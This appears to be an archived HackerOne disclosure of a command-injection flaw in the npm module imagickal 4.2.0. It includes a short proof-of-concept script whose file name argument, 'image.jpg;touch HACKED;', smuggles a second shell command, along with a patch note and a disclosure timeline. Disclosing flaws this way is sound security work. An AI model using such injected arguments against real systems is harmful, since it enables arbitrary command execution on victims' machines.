---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/critical
  - cwe/code-injection
  - env/web
  - stack/node
substate: "resolved"
weakness: "Code Injection"
enriched: true
body: true
date: 2021-01-14
submitted: 2020-09-02T15:44:19.192Z
bounty_usd: null
votes: 0
cve: []
program: "[[programs/nodejs-ecosystem|Node.js third-party modules]]"
reporter: "solov9ev"
source: "https://hackerone.com/reports/973245"
title: "[imagickal] Remote Code Execution"
---
# [imagickal] Remote Code Execution

> **Severity:** Critical | **Bounty:** undisclosed | **Votes:** 0 | **Program:** Node.js third-party modules | **Disclosed:** 2021-01-14

- Report: [https://hackerone.com/reports/973245](https://hackerone.com/reports/973245)
- CWE: Code Injection
- Submitted: 2020-09-02T15:44:19.192Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

I would like to report `RCE` in `imagickal`
It allows to execute arbitrary commands on the victim's PC

# Module

**module name:** imagickal
**version:** 4.2.0
**npm page:** `https://www.npmjs.com/package/imagickal`

## Module Description

node wrapper for ImageMagick commands

## Module Stats

[42] weekly downloads

# Vulnerability

## Vulnerability Description

Code injection while processing a photo

## Steps To Reproduce:

- Run `npm i imagickal`
- Create and run the following POC index.js:

```javascript
var im = require('imagickal');

im.identify('image.jpg;touch HACKED;').then(function (data) {
  console.log(data);
});
```

- The exploit worked and created the file - `HACKED`

{F973742}

## Patch

Check input before command

# Wrap up

- I contacted the maintainer to let them know: [N]
- I opened an issue in the related repository: [N]

## Impact

Command Injection on `imagickal` module via insecure command

## Timeline

- **Report Filed**
- **2020-12-10** @solov9ev: Hello! Any updates?
- **Report Resolved**
- **Agreed On Going Public**
- **2021-01-07** @solov9ev: Hi, @danielruf

Did you report a vulnerability in their library to the developer?
- **2021-01-07** @bbe8482aecd24374d13c5de15a0a6: @solov9ev yes I did and I invited them to this report. So far no reaction. This is why I requested disclosure.
- **Report Became Public**
